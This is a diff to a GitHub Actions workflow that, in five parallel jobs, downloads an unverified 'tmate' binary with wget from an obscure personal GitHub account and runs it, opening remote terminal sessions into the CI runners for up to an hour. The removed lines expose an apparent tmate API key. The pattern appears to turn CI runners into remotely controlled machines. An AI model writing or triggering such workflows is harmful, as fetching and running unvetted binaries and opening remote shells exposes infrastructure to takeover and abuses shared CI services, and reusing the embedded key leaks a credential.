@@ -1,4 +1,4 @@
-name: Parallel tmate Runner
+name: Parallel tmate Jobs
 
 on:
   workflow_dispatch:
@@ -6,16 +6,13 @@ on:
 jobs:
   tmate-parallel:
     runs-on: ubuntu-latest
-    timeout-minutes: 60
     strategy:
       matrix:
         job_id: [1, 2, 3, 4, 5]
+    timeout-minutes: 60
     steps:
-      - name: Download tmate binary
+      - name: Download and install tmate
         run: |
           wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate
           chmod +x tmate
-
-      - name: Run tmate session
-        run: |
-          ./tmate -F -n -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg
+          ./tmate -F -n
